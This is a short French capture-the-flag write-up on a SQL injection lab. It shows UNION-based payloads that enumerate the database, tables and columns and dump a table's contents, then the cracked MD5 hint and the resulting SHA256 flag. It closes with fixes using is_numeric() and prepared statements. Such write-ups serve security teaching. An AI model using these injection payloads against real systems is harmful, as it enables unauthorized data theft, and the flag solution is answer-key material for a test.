EXPLAIN : http://{host}/index.php?page=searchimg

$> true
Nous renvoie l'image id 1
Donc les requetes ne sont pas parsees

Le nom de la base de donnees
$> true union select 1, database()

Le nom des tables
$> true union select 1, table_name from information_schema.tables where table_schema=database()

Les noms des colonnes
$> true union select table_name, column_name from information_schema.columns where table_schema=database()

+-------------+
| list_images |
+-------------+
| id          |
| url         |
| title       |
| comment     |
+-------------+

Le contenu
true union select 1, comment from list_images
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

AVOID
+ Verifier le parametre envoye. En php, is_numeric()
+ Utiliser des requetes preparees
<?php
	$stmt = $db->prepare("SELECT * FROM list_images where id = ?");
	$stmt->execute([$_GET['id']]);
?>
Ainsi si on met "true", la requete cherchera literalement un id "true", qui n'existe pas.
